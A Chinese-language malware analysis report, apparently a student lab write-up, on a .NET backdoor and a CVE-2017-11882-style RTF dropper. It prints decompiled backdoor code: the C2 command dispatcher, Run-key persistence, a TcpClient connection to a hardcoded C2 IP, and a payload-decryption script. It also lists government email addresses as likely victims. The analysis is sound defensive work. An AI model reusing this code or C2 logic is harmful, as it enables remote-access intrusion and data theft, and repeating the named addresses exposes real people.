Class1，並且把裡面的內容丟到dlrarhsiva.exe，再執行，所以如果不想要分析其他有的沒得東西，可以直接看Resources\\dlrarhsiva7這個執行檔 :::spoiler\npublic void UnZip() { try { string apppath = this.get_apppath(); Class1 @class = new Class1(); byte[] wind = @class.getWind(); bool flag = !Directory.Exists(apppath); if (flag) { Directory.CreateDirectory(apppath); } string text = apppath + this.appName; File.WriteAllBytes(text, wind); string text2 = apppath + \u0026#34;mdkhm.zip\u0026#34;; flag = !File.Exists(text2); if (flag) { File.Move(text, text2); } string text3 = text + \u0026#34;.exe\u0026#34;.ToString(); flag = !File.Exists(text3); if (flag) { object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, \u0026#34;NameSpace\u0026#34;, new object[] { apppath }, null, null, null)); object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, \u0026#34;NameSpace\u0026#34;, new object[] { text2 }, null, null, null)); NewLateBinding.LateCall(objectValue, null, \u0026#34;CopyHere\u0026#34;, new object[] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, \u0026#34;Items\u0026#34;, new object[0], null, null, null)), 4 }, null, null, null, true); } Process.Start(text3); } catch (Exception ex) { } } :::\nAnaylize dlrarhsiva.exe 根據DIE發現這也是一個.NET寫的PE file 而且會發現module多了很多，實際進去看會發現應該是實際與C2 server連線和實作指令的地方，也就是後門的指令都在這邊 至於有哪一些操作，詳細可以看後門功能的section\n通訊協定 # 我是直接把any.run的pcap download下來看有哪些東西\nNBNS ARP ICMPv6 LLMNR BROWSER DNS TCP DHCPv6 MDNS STP 其實最主要C2 server和victim的連線主要是TCP，不過因為C2 server貌似沒有在運作了，所以沒辦法連線，我只能大概用連線失敗的封包以及後門的code判斷，至由有沒有其他的連線方式就不是很確定 加解密演算法 # 就我本身的理解，看不太出來哪邊有特別做到加解密的事情，每一個步驟幾乎都只是一般的unscramble或是decompress可以解釋的地方\n後門功能 # Screenshot→ dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen Remove User→dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user 這一段我認為是想辦法把一些資料pull下來後，並且直接執行remove user的動作，所以實際跟進去==dlrarhsivapull_data==這個method，會發現的確如我所預測，只不過實作的方法是他先從server那一端看有多少的bytes需要pull，然後把該值轉成int後就直接pull資料 :::spoiler dlrarhsivapull_data() Source Code\n// dlrarhsiva.OLRDMR // Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C public void dlrarhsivaremove_user() { try { byte[] array = this.server.dlrarhsivapull_data(); if (array != null) { if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + \u0026#34;.exe\u0026#34;)) { File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + \u0026#34;.exe\u0026#34;, array); this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + \u0026#34;.exe\u0026#34;); } } } catch { } } :::\nFetch Victim\u0026rsquo;s Info→dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo 從以下source code可以知道使用Info這個command可以得知victim的Username或是MachineName :::spoiler dlrarhsivaInfo() Source Code\n// dlrarhsiva.MLRLEINF // Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C private void dlrarhsivaInfo() { this.dlrarhsivaapver = \u0026#34;M.0.0.5|dlrarhsiva\u0026#34;.Split(new char[] { \u0026#39;|\u0026#39; })[0]; this.dlrarhsivacname = Environment.MachineName; this.dlrarhsivauname = Environment.UserName; this.dlrarhsivauip = \u0026#34;\u0026#34;; this.dlrarhsivalancard = \u0026#34;\u0026#34;; } :::\nOthers 由於攻擊者可以使用的command實在是太多了，所以就直接列出來看比較清楚 比較重要的是get_command這個method，這個就和前面提到的pull data那個差不多，只是他後面還會帶上command和argument，便於下一些指令\n另外，dlrarhsivaimage_info()這個method主要是看指定的圖片的一些相關資訊並且把該檔案上傳到某個地方，除此之外，還可以做到刪除檔案、上傳檔案、儲存檔案、查看user資訊等等，所有的command可以查看dlrarhsivasee_responce()這個method，裡面有紀錄所有遇到不同的command會執行對應的method(共有25個，詳細source code如下) :::spoiler\n// dlrarhsiva.MLREDM // Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8 private void dlrarhsivasee_responce() { if (!this.dlrarhsivaiswitch) { this.dlrarhsivaiswitch = true; this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck); this.dlrarhsivacapScreen = false; while (this.dlrarhsivais_working) { MLREDM.\u0026lt;\u0026gt;c__DisplayClasse CS$\u0026lt;\u0026gt;8__locals1 = new MLREDM.\u0026lt;\u0026gt;c__DisplayClasse(); CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this = this; CS$\u0026lt;\u0026gt;8__locals1.switchType = this.dlrarhsivaget_command(); if (CS$\u0026lt;\u0026gt;8__locals1.switchType == null) { this.dlrarhsivais_working = false; break; } this.dlrarhsivareqCnls = false; string text = CS$\u0026lt;\u0026gt;8__locals1.switchType[0].ToLower(); if (text.Split(new char[] { \u0026#39;-\u0026#39; }).Length \u0026gt; 1) { text = \u0026#34;dlrarhsiva-\u0026#34; + text.Split(new char[] { \u0026#39;-\u0026#39; })[1]; } else { text = \u0026#34;dlrarhsiva-\u0026#34; + text; } string text2 = text; switch (text2) { case \u0026#34;dlrarhsiva-procl\u0026#34;: this.dlrarhsivafunStarter = delegate() { this.dlrarhsivalist_processes(\u0026#34;procl\u0026#34;); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-getavs\u0026#34;: this.dlrarhsivafunStarter = delegate() { this.dlrarhsivalist_processes(\u0026#34;getavs\u0026#34;); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-thumb\u0026#34;: this.dlrarhsivaimage_info(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-putsrt\u0026#34;: this.dlrarhsivaload_app(); break; case \u0026#34;dlrarhsiva-filsz\u0026#34;: this.dlrarhsivafile_info(CS$\u0026lt;\u0026gt;8__locals1.switchType[1], false); break; case \u0026#34;dlrarhsiva-rupth\u0026#34;: this.dlrarhsivapush_data(null, \u0026#34;dlrarhsiva-appth=|dlrarhsiva\u0026#34;.Split(new char[] { \u0026#39;|\u0026#39; })[0] + DLAONIF.dlrarhsivaget_mpath(), false); break; case \u0026#34;dlrarhsiva-dowf\u0026#34;: this.dlrarhsivasaveFile(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-endpo\u0026#34;: try { Process.GetProcessById((int)Convert.ToInt16(CS$\u0026lt;\u0026gt;8__locals1.switchType[1].Trim())).Kill(); } catch { } break; case \u0026#34;dlrarhsiva-scrsz\u0026#34;: this.dlrarhsivascreenSize(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-cscreen\u0026#34;: this.dlrarhsivasee_scren(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-dirs\u0026#34;: this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives)); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-stops\u0026#34;: this.dlrarhsivacapScreen = false; break; case \u0026#34;dlrarhsiva-scren\u0026#34;: this.dlrarhsivacapScreen = true; this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivais_screen(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-cnls\u0026#34;: this.dlrarhsivaautCnls = true; this.dlrarhsivareqCnls = true; this.dlrarhsivacapScreen = false; break; case \u0026#34;dlrarhsiva-udlt\u0026#34;: this.dlrarhsivaCMD.dlrarhsivaremove_user(); break; case \u0026#34;dlrarhsiva-delt\u0026#34;: this.dlrarhsivaremove_file(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-afile\u0026#34;: this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivasend_auto(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-listf\u0026#34;: this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-file\u0026#34;: this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivapush_file(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-info\u0026#34;: this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info)); this.dlrarhsivafunThread.Start(); break; case \u0026#34;dlrarhsiva-runf\u0026#34;: this.dlrarhsivaCMD.dlrarhsivado_process(CS$\u0026lt;\u0026gt;8__locals1.switchType[1].Split(new char[] { \u0026#39;\u0026gt;\u0026#39; })[0]); break; case \u0026#34;dlrarhsiva-fles\u0026#34;: { string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); if (files != null) { this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivapush_data(null, \u0026#34;dlrarhsiva-fles=|dlrarhsiva\u0026#34;.Split(new char[] { \u0026#39;|\u0026#39; })[0] + files, false); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); } break; } case \u0026#34;dlrarhsiva-dowr\u0026#34;: this.dlrarhsivasaveFile(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); break; case \u0026#34;dlrarhsiva-fldr\u0026#34;: { string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$\u0026lt;\u0026gt;8__locals1.switchType[1]); if (Folders != null) { this.dlrarhsivafunStarter = delegate() { CS$\u0026lt;\u0026gt;8__locals1.\u0026lt;\u0026gt;4__this.dlrarhsivapush_data(null, \u0026#34;dlrarhsiva-fldr=|dlrarhsiva\u0026#34;.Split(new char[] { \u0026#39;|\u0026#39; })[0] + Folders, false); }; this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter); this.dlrarhsivafunThread.Start(); } break; } } } this.dlrarhsivais_working = false; this.dlrarhsivacapScreen = false; } this.dlrarhsivaiswitch = false; } :::\n常駐方式 # 根據Any.Run的ATT\u0026amp;CK Matrix以及我自己分析的結果，看到他使用timer這個方式當作persisten的手法，當do_start() method啟動之後，隔一段時間就會觸發連線，並且每隔一段時間就會重新檢查connection(雖然Any.Run沒有看出來)，所以我猜這個手法對應的ATT\u0026amp;CK ID應該是T1053.006 public void dlrarhsivado_start() { DLAONIF.dlrarhsivaport = DLAONIF.ports[0]; this.dlrarhsivaUPC = new MLRLEINF(); this.dlrarhsivaCMD = new OLRDMR(this); this.dlrarhsivaHD.iserver = this; this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath(); TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect); System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420); this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer; } 另外，無意間用Autorun發現他有把Hdlharas\\dlrarhsiva.exe註冊到registry中，這也是常見的套路，以ATT\u0026amp;CK的framework來說，應該是T1547.001(Any.Run還是沒有看出來)，詳細的code如下 public static void dlrarhsivaset_run(string app, string path) { try { string name = \u0026#34;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|dlrarhsiva\u0026#34;.Split(new char[] { \u0026#39;|\u0026#39; })[0]; RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true); string str = DLAONIF.dlrarhsivapc_id; object value = registryKey.GetValue(str + app); if (value == null) { registryKey.SetValue(str + app, path); } else if (value.ToString() != path) { registryKey.SetValue(str + app, path); } } catch { } } 這是在DLAONIF這個module中，主要會由MLREDM/dlrarhsivaload_app這個method呼叫到，對應倒的指令是==dlrarhsiva-putsrt== 中繼站 # 基本資訊 # 在前面提到的後門功能中有一個是專門處理網路連線的(dlrarhsivaIPSConfig)，這其實蠻有趣的，他不直接寫出連線的IP，反而是做了簡單的ascii轉換後才進行連線，如下所示\nMLREDM/dlrarhsivaIPSConfig() 這一段主要是進行連線，但是在連線前會進行IP parsing和fetching port的動作(如下一段所示) // dlrarhsiva.MLREDM // Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C private bool dlrarhsivaIPSConfig() { bool result; try { DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD(); this.dlrarhsivatcpsck = new TcpClient(); this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport); result = true; } catch { this.dlrarhsivaports_switch(); result = false; } return result; } OLRDMR/dlrarhsivaserverIPD() 這一段就是把DLAONIF.dlrarhsivavpsips轉換成UTF-8而已，原本是ascii的integer形式，轉換後就變成一般的ascii string，也就是==185.136.161.124== using System; using System.Diagnostics; using System.IO; using System.Net.Sockets; using System.Text; namespace dlrarhsiva { // Token: 0x02000009 RID: 9 internal class OLRDMR { ... public string dlrarhsivaserverIPD() { return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length); } ... // Token: 0x0400003A RID: 58 public MLREDM server; } } DLAONIF/ 也可以自行轉換下面的IP，另外他有好幾個Port，詳細的code可以參考MLREDM/dlrarhsivaports_switch()這個method，在default port 6128連不上去的時候可以自行切換預先設定好的port number using System; using System.IO; using System.Windows.Forms; using Microsoft.Win32; namespace dlrarhsiva { // Token: 0x02000002 RID: 2 internal static class DLAONIF { ... public static int[] ports = new int[] { 6128, 8761, 11614, 15822, 17443 }; // Token: 0x04000005 RID: 5 public static byte[] dlrarhsivavpsips = new byte[] { 49, 56, 53, 46, 49, 51, 54, 46, 49, 54, 49, 46, 49, 50, 52 }; // Token: 0x0400000A RID: 10 public static string dlrarhsivaAppPath = \u0026#34;\u0026#34;; } } 關連資訊 # 我不是很確定關聯資訊想要的形式是什麼，所以我選擇參考whois的結果和VirusTotal的結果互相對照，這個IP是來自於法國的Strasbourg，是在德國與法國超邊界的地方\n威脅情資 # 攻擊者 # Duty Staff Officer \u0026lt;ram.ratan909@navy.gov.in\u0026gt;，我在OSINT的各個online tool都沒有找到相關的資訊，而且有些甚至還說這是valid，想一想也對，這個mail的format看起來是屬於政府單位，所以我猜可能是政府單位的某個AD account被拿下來，然後就發送這樣的訊息出去，成功率看起來也會比較高 :::danger 正確答案是攻擊者可以篡改mail文件中的寄送人和router資訊，所以要實際去裡面看寄送的IP，有可能這個就是該攻擊者的C2 Server，所以其實攻擊者沒有把AD account拿下來 :::\n攻擊時間 # Tue, 28 Apr 2020 10:50:41 +0530 (IST)\n受害者 # 從郵件中的CC User來看，\u0026ldquo;可能\u0026quot;的受害者有以下幾個\n\u0026#34;Wg Cdr MA JAFFER ALI\u0026#34; \u0026lt;jdwcdma@iaf.nic.in\u0026gt; \u0026#34;Wg Cdr PAWAN BENIWAL\u0026#34; \u0026lt;wanwal.26965@gov.in\u0026gt; \u0026#34;Wg Cdr Kundan Kumar\u0026#34;\u0026lt;challenger@nic.in\u0026gt; \u0026#34;Wing Commander Raji kurian\u0026#34; \u0026lt;yatch.master@gov.in\u0026gt; \u0026#34;SLO 54 ASP\u0026#34; \u0026lt;teacher_town@nic.in\u0026gt; \u0026#34;Gp Capt Atul Kumar Arora\u0026#34; \u0026lt;moon.light@gov.in\u0026gt; \u0026#34;Flt Lt Richa Bansal\u0026#34; \u0026lt;mtl.amer@nic.in\u0026gt; 樣本(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9) # 惡意程式 # 檔案資訊 # DIE(Detect It Easy) 從DIE來看並沒有什麼特別的packer或是linker，反而出現RTF格式，一開始不知道這是什麼，但根據4的說明，應該可以理解成比較廣泛性的Word文字檔案 富文本格式（Rich Text Format, 一般簡稱為RTF）是由微軟公司開發的跨平台文檔格式。大多數的文字處理軟體都能讀取和保存RTF文檔。RTF是Rich TextFormat的縮寫，意即多文本格式。這是一種類似DOC格式（Word文檔）的檔案，有很好的兼容性，使用Windows“附屬檔案”中的“寫字板”就能打開並進行編輯。RTF是一種非常流行的檔案結構，很多文字編輯器都支持它。一般的格式設定，比如字型和段落設定，頁面設定等等信息都可以存在RTF格式中，它能在一定程度上實現word與wps檔案之間的互訪。\nFile/Stat/Exiftool 從以下的結果來看，這個檔案的確是RTF格式且Created Time是在2019年 :::spoiler Command Result $ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID 1025 $ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9 ExifTool Version Number : 12.40 File Name : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9 Directory : . File Size : 217 KiB File Modification Date/Time : 2023:08:14 11:54:52+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : RTF File Type Extension : rtf MIME Type : text/rtf Warning : Unsupported RTF encoding cp936. Will assume Latin. Last Modified By : Koby Create Date : 2019:12:24 10:28:00 Modify Date : 2019:12:24 10:28:00 Revision Number : 2 Total Edit Time : 0 Pages : 1 Words : 252 Characters : 1441 Characters With Spaces : 1690 Internal Version Number : 117 $ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9 File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9 Size: 222012 Blocks: 440 IO Block: 4096 regular file Device: 66h/102d Inode: 2814749767539972 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.947690500 +0800 Modify: 2023-08-14 11:54:52.000000000 +0800 Change: 2024-02-29 16:55:48.947690500 +0800 Birth: - ::: 這一題在沒有看VirusTotal或是Any.Run的情況之下，我在local VM內真的看不出來有什麼問題，後來忍不住上網看一下相關的hash，發現他是使用==CVE-2017-11882==這個由Microsoft提出的漏洞開發出來的malware file5，而比較新的版本大部分都已經被patch了，所以我在VM內才會找不出相關的攻擊痕跡(浪費了很多時間) 從上圖來看，沒有看到任何執行EQNEDT32.EXE的process，為了能夠在local端實際看到攻擊的軌跡，我從學校的授權軟體網站中下載了Office 2016(原本是2021)，才發現相關的patch還沒普及到這個版本(是不是要通報一下計中呢??🤔) :::danger 這個CVE是錯的，和EQNEDT32.EXE有關的CVE有三個: CVE-2017-11882 CVE-2018-0802 CVE-2018-0798 所以其實不是目前的這一個，這也證明了我找超久都沒有找到的EQNEDT32.EXE的洞是哪裡 ::: 執行流程 # :::info 因為這一題我是在已知漏洞CVE的前提下進行分析，所以我會先假裝在不知道的情況下，敘述我可能會如何分析，如果途中有某個地方是我不知道如何繼續進行或是某個background knowledge我一定先知道，我會標註其中 ::: :::danger 因為不能使用線上sandbox tools，所以其實應該要有command sense是直接使用RTFOBJ進行Parsing，並且針對Embedded的File去OSINT他就可能可以不需要透過AnyRun知道他是哪一個CVE造成的惡意樣本 :::\nProcess Monitor 在執行一個可疑的file時，我會嘗試先用process monitor以及wireshark錄製其中盡可能詳細的所有過程(當然實行前一定要先snapshot)，然後看一下中間的過程有無觸及到CreateFile、WriteFiile以及registry這樣的操作 為了要更準確的filter不必要的紀錄，我設定的條件是:\nOperation is WriteFile then Include Process Name is Wireshark.exe then Exclude Process Name is dumpcap.exe then Exclude 接著我就發現有一個==EQNEDT32.exe==的process寫了一個intel.wll的檔案到C:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\intel.wll 當然這也要有足夠的經驗才有辦法更準確的猜測這是一個可能有問題的操作，所以這一個process有一部分是參考網路上CVE的說明才更確定這個方向是對的 Analyze EQNEDT32.exe 為了更進一步知道我的想法是否正確，所以我修改了我的filter rule→\nProcess Name is EQNEDT32.exe then Include Process Name is Wireshark.exe then Exclude Process Name is dumpcap.exe then Exclude 發現有很多不同的process都有BoF的問題 而直到比較後端的操作才出現CreateFile、WriteFile、CloseFile的操作，主要是 C:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\intel.wll和C:\\Users\\REM\\AppData\\Local\\Temp\\8.t 所以，到目前為止可以很確定的事情是這個RTF File，裡面運藏了一些檔案，所以我打算針對這個file進行靜態的分析，但是我當然看不懂office針對RTF的語法和結構為何，所以根據6的說明提到可以用RTFOBJ這個tool，幫忙parse其中的內容，結果如下\n$ rtfobj -s all 5bbf2643a601e632a49406483c8f c5262a76e206bd969f2ba3f4f2e238768ab9 rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: \u0026#39;5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9\u0026#39; - size: 222012 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |0000E970h |format_id: 2 (Embedded) | |class name: b\u0026#39;Package\u0026#39; | |data size: 73928 | |OLE Package object: | |Filename: \u0026#39;8.t\u0026#39; | |Source path: \u0026#39;C:\\\\Aaa\\\\tmp\\\\8.t\u0026#39; | |Temp path = \u0026#39;C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\8.t\u0026#39; | |MD5 = \u0026#39;8eac8203cf56f2b24753986353deac7e\u0026#39; | |File Type: Unknown file type ---+----------+--------------------------------------------------------------- 1 |00032B90h |format_id: 2 (Embedded) | |class name: b\u0026#39;Equation.2\\x00\\x124Vx\\x90\\x124VxvT2\u0026#39; | |data size: 6436 | |MD5 = \u0026#39;a09e82c26f94f3a9297377120503a678\u0026#39; ---+----------+--------------------------------------------------------------- 2 |00032B76h |Not a well-formed OLE object ---+----------+--------------------------------------------------------------- Saving file from OLE Package in object #0: Filename = \u0026#39;8.t\u0026#39; Source path = \u0026#39;C:\\\\Aaa\\\\tmp\\\\8.t\u0026#39; Temp path = \u0026#39;C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\8.t\u0026#39; saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t md5 8eac8203cf56f2b24753986353deac7e Saving file embedded in OLE object #1: format_id = 2 class name = b\u0026#39;Equation.2\\x00\\x124Vx\\x90\\x124VxvT2\u0026#39; data size = 6436 saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin md5 a09e82c26f94f3a9297377120503a678 Saving raw data in object #2: saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw md5 a3540560cf9b92c3bc4aa0ed52767b8a 我發現其實內藏的檔案其實是8.t\nAnalyze RTF Malware File 我想要跟一下這個RTF因為stack overflow的問題到底是怎麼變成RCE的，所以我先用Proess Monitor知道他會call到CreateFile這個API，因此我先用x32dbg attach eqnedt32.exe這個file，然後設定breakpoint到kernelbase.dll中的CreateFileA這個API 接著我直接啟動malware file，dbg會停在CreateFile上，此時我回去看stack上的return address 發現他會return到026A878F這個地方(每一次執行會不一樣，有點類似ASLR，不過通常會把要執行的shellcode放在26AXXXX開頭的地方)，這個位置存的應該就是他的shellcode 詳細的分析怎麼做到這一步shellcode的 首先，我已經知道他是怎麼利用stack overflow的方式放上shellcode，但是我找了超久都還是沒有找到2016版本的漏洞在哪裡，應該說根據7的說明，我知道因為在複製字體名稱的時候，沒有檢查字的長度，所以可以利用這一點蓋到return address，也就是說，可以讓程式跳到我們預先設定好的shellcode上面，那為什麼找不到他檢查長度的地方呢?因為我的做法是利用stack上的backtrace去看call完CreateFile之後要回到哪裡去判斷他是什麼時候篡改了return address，但跟完動態發現他似乎很早就已經把shellcode放上去了(只是什麼時候不太清楚)，所以礙於時間的關係，我先往下分析，詳細的流程如下: 到最後他會到0x430BFB這個位置然後跳到0x268A48C，請注意看一下底下一點的code當中有一個jmp 0x268A4BE，這個一跳過去就會使dbg重新編譯過，這也是shellcode很常使用到的技巧 若順著這一條往下執行，他ret的地方就會變成，==0x26A6E8A==(當然每一次都不一樣，因為是動態的) 從這一段開始就是有關於呼叫windows API的部分，而且可以看到，剛跳過去的時候也是一樣call了==0x26A6E8E==，讓真正的shellcode藏在其中 Decrypt 這一段應該就是在decrypt後續的shellcode，可以看到他不斷loop做一件事情，那就是XOR目前取得的word bytes(0xC390)，總共應該做了0x8BA次，每次改2 Bytes 可以看到decrypt後就真的能辨識一些字元 decrypt完的code截圖如下，這才是真正的shellcode 做的事情如下\n解析出ntdll.dll和kernelbase.dll 這一段很有趣，他應該就是我在2023 Lab - WinMalware - Dynamic API Resolution Background中學到的API Resolution技巧\n不靠 loader，在 runtime 自行爬取系統結構，取得所需的 Windows API\n第一個使用的dll是msvcrt.dll，以此類推，我們可以把下一個function當作是在爬kernel32.dll Fetch API 這個是我看到熟悉的老朋友→Magic Header(MZ和PE字樣)，其實這一段就是在fetch各個dll file的API(只要給定dll的file當作參數給這個function，就可以爬到想要的API)，我自己看到的總共有以下個:\nGetProcAddresss-\u0026gt;kernel32.dll VirtualProtext-\u0026gt;kernel32.dll clearerr-\u0026gt;ucrtbase.dll CreateFileA-\u0026gt;kernel32.dll GetFileSize-\u0026gt;kernel32.dll ReadFile-\u0026gt;kernel32.dll WriteFile-\u0026gt;kernel32.dll CloseHandle-\u0026gt;kernel32.dll CreateProcessA-\u0026gt;kernel32.dll GetModuleFileNameA-\u0026gt;kernel32.dll ResumeThread-\u0026gt;kernel32.dll TerminateProcess-\u0026gt;kernel32.dll --- GetThreadContext-\u0026gt;kernel32.dll ReadProcessMemory-\u0026gt;kernel32.dll GetModuleHandleA-\u0026gt;kernel32.dll WriteProcessMemory-\u0026gt;kernel32.dll SetThreadContext-\u0026gt;kernel32.dll ZwUnmapViewOfSection-\u0026gt;ntdll.dll CreateFile \u0026amp; VitualAlloc \u0026amp; Decrypt Fetch完API後，他就Create C:\\Users\\REM\\AppData\\Local\\Temp\\8.t 並且取得他的大小後開一個同樣大小的空間給current process，接著他用ReadFile把讀取倒的所有內容放到該空間中 取完資料後如下 ReadFile完後就開始解密原本的內容，詳細的解密過程如下(一整大段都是): :::spoiler Psudo Code\nfrom Crypto.Util.number import long_to_bytes data = open(\u0026#39;./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t\u0026#39;, \u0026#39;rb\u0026#39;).read() key = 0x48B53A6C idx = 0 file_size = len(data) decrypt_data = b\u0026#34;\u0026#34; if file_size \u0026gt; 0: while idx \u0026lt; file_size: ebx = 7 while ebx \u0026gt; 0: ecx = key \u0026gt;\u0026gt; 26 ecx ^= key ecx \u0026gt;\u0026gt;= 3 ecx ^= key key *= 2 if key \u0026gt; 0x100000000: key -= 0x100000000 ecx \u0026amp;= 1 key |= ecx key += 1 ebx -= 1 decrypt_data += long_to_bytes(data[idx] ^ (key \u0026amp; 0xFF)) idx += 1 open(\u0026#39;./8.t_decrypt\u0026#39;, \u0026#39;wb\u0026#39;).write(decrypt_data) :::\nCreateFile \u0026amp; WriteFile 接著他創了C:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\intel.wll這個file必且寫上一些東西，其實就是我們剛剛decrypt的檔案\nAnalyze intel.wll 首先他先Decrypt儲存在內部的執行檔(有加密過的)，然後把他寫到\nC:\\Users\\REM\\AppData\\Local\\Temp\\taskhost.exe 這個檔案中，解密就是一個了無新意的XOR，解密的code如下: :::spoiler\nvoid __cdecl CreateTask(LPCSTR lpFileName) { LPCVOID *lpBuffer; // edi HANDLE FileA; // ebp unsigned int i; // esi unsigned int counter; // eax _BYTE *v5; // ecx DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h] BYREF // 寫到Task.exe的大小總共是0xB000，每一次寫16bytes(記得要從後面寫回來)，要寫2816次 lpBuffer = (LPCVOID *)operator new(16u); FileA = CreateFileA(lpFileName, GENERIC_WRITE, 0, 0, CREATE_NEW, 0, 0); if ( FileA != (HANDLE)-1 ) { for ( i = 